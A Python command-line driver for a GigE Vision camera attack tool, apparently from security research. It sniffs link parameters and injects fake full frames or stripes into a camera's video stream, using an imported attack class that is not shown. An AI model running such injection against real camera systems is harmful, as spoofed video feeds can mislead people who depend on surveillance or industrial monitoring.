"""
GigE Vision Attack Tool - Main Script

This script demonstrates the usage of the GigEVisionAttackTool for various attack scenarios.
It provides a command-line interface to execute different types of attacks on GigE Vision cameras.

WARNING: This tool is intended for authorized testing and research purposes only.
Unauthorized use of this tool may be illegal and unethical.

Usage:
    python attack_tool_main.py [options]

Options:
    -m, --mode        Attack mode (full_frame_injection, stripe_injection)
    -p, --path        Path to image file for injection
    -d, --duration    Duration of the attack in seconds
    -r, --rate        Frame rate for injection
    --setup           Setup to use (WINDOWS_VIMBA, WINDOWS_MATLAB_REC, WINDOWS_MATLAB_PREVIEW, LINUX_ROS)
    --help            Show this help message and exit

Example:
    python attack_tool_main.py -m full_frame_injection -p /path/to/image.jpg -d 10 -r 30 --setup WINDOWS_VIMBA
"""

import argparse
import logging

from gige.gige_attack_tool import GigEVisionAttackTool
from gige_attack_config import Setup, get_config

# Configure logging
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)


def parse_arguments():
    parser = argparse.ArgumentParser(description="GigE Vision Attack Tool")
    parser.add_argument(
        "-m",
        "--mode",
        choices=["full_frame_injection", "stripe_injection"],
        required=True,
        help="Attack mode",
    )
    parser.add_argument(
        "-p", "--path", required=True, help="Path to image file for injection"
    )
    parser.add_argument(
        "-d", "--duration", type=float, default=5, help="Duration of attack in seconds"
    )
    parser.add_argument("-r", "--rate", type=float, help="Frame rate for injection")
    parser.add_argument(
        "--setup",
        type=Setup,
        choices=list(Setup),
        default=Setup.WINDOWS_VIMBA,
        help="Setup to use",
    )
    return parser.parse_args()


def initialize_attack_tool(config: dict) -> GigEVisionAttackTool:
    return GigEVisionAttackTool(
        interface=config["interface"],
        cp_ip=config["cp_ip"],
        camera_ip=config["camera_ip"],
        max_payload_bytes=config["max_payload_bytes"],
        img_width=config["img_width"],
        img_height=config["img_height"],
        logger=logger,
    )


def main():
    args = parse_arguments()
    config = get_config(args.setup)

    # Initialize the attack tool
    attack_tool = initialize_attack_tool(config)

    # Sniff link parameters
    attack_tool.sniff_link_parameters()

    # Set the frame rate
    frame_rate = args.rate or (1 / config["sendp_ampiric_frame_time"])

    if args.mode == "full_frame_injection":
        logger.info(
            f"Injecting full frame from {args.path} for {args.duration} seconds at {frame_rate} fps"
        )
        logger.info(f"Using interface: {config['interface']}")
        attack_tool.fake_still_image(
            img_path=args.path,
            duration=args.duration,
            injection_effective_frame_rate=frame_rate,
        )
    elif args.mode == "stripe_injection":
        logger.info(
            f"Injecting stripe from {args.path} for {args.duration} seconds at {frame_rate} fps"
        )
        logger.info(f"Using interface: {config['interface']}")
        attack_tool.inject_stripe_consecutive_frames(
            img_path=args.path,
            first_row=0,  # Adjust as needed
            num_rows=10,  # Adjust as needed
            fps=frame_rate,
            injection_duration=args.duration,
        )

    logger.info("Attack finished")


if __name__ == "__main__":
    main()
